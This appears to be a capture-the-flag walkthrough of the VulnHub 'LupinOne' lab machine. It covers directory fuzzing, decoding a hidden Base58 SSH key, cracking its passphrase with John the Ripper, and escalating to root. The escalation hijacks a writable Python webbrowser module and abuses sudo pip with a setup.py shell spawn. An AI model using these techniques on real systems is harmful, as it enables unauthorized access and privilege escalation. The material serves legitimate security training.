# LupinOne

Welcome to my comprehensive walkthrough of the "LupinOne" machine, available for download at [VulnHub](https://www.vulnhub.com/entry/empire-lupinone,750/). This guide aims to detail each step taken to exploit this machine, from initial enumeration to privilege escalation.

## Enumeration

### Nmap Scan

Our journey begins with an Nmap scan to discover open ports and services:

```
nmap -sCV -p- 192.168.75.130
```
#### Scan Results

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-27 23:23 GMT
Nmap scan report for 192.168.75.130
Host is up (0.00081s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA)
|   256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA)
|_  256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519)
80/tcp open  http    Apache httpd 2.4.48 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/~myfiles
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.12 seconds
```
This shows there are two ports open here `port 22` running SSH service and `Port 80` running an Apache server hosting a web server.

The scan results revealed the following:

- SSH Service on Port 22: Running OpenSSH 8.4p1 Debian 5.
- HTTP Service on Port 80: Apache httpd 2.4.48 on Debian, with an intriguing entry in `robots.txt` (`/_/~myfiles`).

### Web Server Enumeration

Upon visiting the web server, I encountered a sparse page featuring only a central image.

![image](https://github.com/vsang181/VulnHub/assets/28651683/fdeb6380-6fd9-498d-badf-420c4878bad8)

However, the `robots.txt` file hinted at potential hidden directories, prompting further investigation.

![image](https://github.com/vsang181/VulnHub/assets/28651683/0c6cf20a-3c44-4ac3-856d-eb066cfd21bd)

Now going to this directory gives us Error 404.

However, this does provide a clue about potential other directories that could be explored. The presence of the `~` sign preceding the directory name suggests the possibility of uncovering more directories by employing fuzzing techniques with a dictionary list.

#### Directory Fuzzing

For this case I am ussing the tool called [ffuf](https://github.com/ffuf/ffuf).

To uncover hidden directories, I employed `ffuf` with a comprehensive wordlist:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.75.130/~FUZZ
```

This aggressive fuzzing strategy led to the discovery of a directory named `~secret`.

![image](https://github.com/vsang181/VulnHub/assets/28651683/cc856172-796d-4535-854d-b6d1d012f4c5)

### Investigating `~secret`

![image](https://github.com/vsang181/VulnHub/assets/28651683/a05874d8-20fe-4aab-87b7-bb0c153dfaeb)

This discovery is intriguing: it appears that the user `icex64` has generated an SSH private key, which seems to be concealed within this directory. 

Given this insight, it's plausible that we can access the file at `http://192.168.75.130/~secret/.filename`, especially since in Linux systems, hidden files often begin with a `.`.

To further investigate, I decided to employ the `ffuf` tool once again.

It's worth noting that during my initial scans, the results were cluttered with numerous error files. To address this, I incorporated the `-fc 403` option to filter these out.

Additionally, I appended common file extensions relevant to Apache webservers, such as `.html`, `.txt`, and `.php`. This was done using the `-e` option to tailor the search for these specific file types.

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.75.130/~secret/.FUZZ -e .php,.html,.txt -fc 403 
```

## Exploitation

We discovered a file that piqued our interest.

![image](https://github.com/vsang181/VulnHub/assets/28651683/5d264c1d-199e-4d00-aa1c-bd0d766e503e)

Taking a closer look at the file, it appeared to contain a hash value. To determine the hash type, I planned to use an online tool for assistance.

![image](https://github.com/vsang181/VulnHub/assets/28651683/d4dc66d6-47dc-498c-81d8-13516b3f5f5a)

I utilized the [dcode.fr](https://www.dcode.fr/cipher-identifier) cipher identifier, a tool I often rely on, which suggested that the hash was likely a `Base58` encoded string.

![image](https://github.com/vsang181/VulnHub/assets/28651683/6e43ad44-f05c-4303-a701-e657aa85d699)

To decode this, I wrote a Python script for converting the Base58 encoded string back to its original text.

```
import base58

def decode_base58(encoded_str):
    try:
        # Decode the Base58 encoded string
        decoded_bytes = base58.b58decode(encoded_str)
        # Convert bytes to a string (assuming UTF-8 encoding)
        decoded_str = decoded_bytes.decode('utf-8')
        return decoded_str
    except Exception as e:
        return str(e)

# Example usage - replace 'YourBase58hashHere' with a valid Base58 string
encoded_string = "YourBase58hashHere"
decoded_string = decode_base58(encoded_string)

print(decoded_string)
```

The script successfully decoded the hash, revealing it to be an SSH private key

I proceeded to save this key into a file named `id_rsa`.

![image](https://github.com/vsang181/VulnHub/assets/28651683/e763b6d6-2bde-4951-8cbd-987876a03cbb)

Next, I ensured the file had the `correct permissions` by executing:

```
chmod 600 id_rsa
```

Attempting to SSH into the machine with the username `icex64` and the private key prompted a request for the `key's passphrase`.

![image](https://github.com/vsang181/VulnHub/assets/28651683/a003c6eb-704a-48ba-9d8f-3e5c86257a44)

Lacking the passphrase, I turned to `John the Ripper` for help. Before that, it was necessary to convert `id_rsa` into a format readable by the tool using [ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py).

```
ssh2john id_rsa > id_rsa.txt
```

Selecting an appropriate wordlist, I recalled the `fasttrack` word mentioned in the initial hint found in the `~secret` directory and there is a `fasttrack.txt` wordlist present in wordlists folder on Kali Linux. therefore I chose it for the brute-force attack.

```
john -wordlist=/usr/share/wordlists/fasttrack.txt id_rsa.txt
```

![image](https://github.com/vsang181/VulnHub/assets/28651683/41693418-424f-49ea-9172-dc807a1c83ae)

The brute-forcing effort successfully retrieved the passphrase, allowing SSH access as `icex64`.

Logging in as `icex64`.

![image](https://github.com/vsang181/VulnHub/assets/28651683/3bebd59f-2aa8-4f3b-8e7e-6183eab8b5bc)

I successfully captured the user flag.

![image](https://github.com/vsang181/VulnHub/assets/28651683/0d69c853-4ac3-4be3-b527-7978f925709a)

## Priviledge Escalation

On the SSH session, I ran `sudo -l` to check if any commands could be executed as root from the current user.

![image](https://github.com/vsang181/VulnHub/assets/28651683/9b0a431a-eeed-4e4a-a365-3093718bbc59)

The output indicated that I could run the `heist.py` script, located in /home/arsene, as the user `arsene`. I decided to inspect the file.

![image](https://github.com/vsang181/VulnHub/assets/28651683/3f046d19-6c9c-44ab-96ec-b3c8c8ffcaee)

The script seemed simple and potentially vulnerable to manipulation for privilege escalation, but I didn't have the permission to modify it directly.

![image](https://github.com/vsang181/VulnHub/assets/28651683/dbd3e86e-7d91-48b9-be51-315c657da067)

I noticed that the script imported the `webbrowser` module, which led me to consider if I could alter the module itself.
 
To locate the `webbrowser.py` file on the disk, I used the command:
 
```
find / -name webbrowser.py 2>/dev/null
```
 
![image](https://github.com/vsang181/VulnHub/assets/28651683/510715fe-f5df-4958-945d-abfd21ab6796)

Examining the file's permissions revealed that I had full write access.

![image](https://github.com/vsang181/VulnHub/assets/28651683/d974e36e-cfe8-4879-8c2b-08970c94b592)

With this access, I modified the `webbrowser.py` library to spawn a shell as user `arsene`, which would be executed when `heist.py` was run.

```
os.system("/bin/bash")
```
![image](https://github.com/vsang181/VulnHub/assets/28651683/ec53a7d7-53b2-4253-8b99-73f4b3fcd46e)

I then executed `heist.py` as arsene.

```
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
```

Successfully obtaining a shell as this user.

![image](https://github.com/vsang181/VulnHub/assets/28651683/00e163b4-06a4-4ac2-a312-da4684f70e37)

Running `sudo -l` again, this time as `arsene`, I checked for commands that could be executed as root without a password.

![image](https://github.com/vsang181/VulnHub/assets/28651683/d85bd532-af80-48f7-9d25-b9296dd102f5)

For guidance on exploiting `pip`, I referred to [GTFOBins](https://gtfobins.github.io/), an excellent resource for such situations.

Following the instructions from `GTFOBins`, I executed a series of commands to spawn an interactive root shell.

```
TF=$(mktemp -d)
```

```
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
```

```
sudo pip install $TF
```

Finally, this method successfully granted me root access.

![image](https://github.com/vsang181/VulnHub/assets/28651683/8d62bd70-618d-40e5-a761-12dbd7c8c718)

Allowing me to capture the coveted root flag.

![image](https://github.com/vsang181/VulnHub/assets/28651683/71899e4c-80db-4da1-af47-b663672ff4f5)

## Let's Connect

I welcome your insights, feedback, and opportunities for collaboration. Together, we can make the digital world safer, one challenge at a time.

- **LinkedIn**: (https://www.linkedin.com/in/aashwadhaama/)

I look forward to connecting with fellow cybersecurity enthusiasts and professionals to share knowledge and work together towards a more secure digital environment.
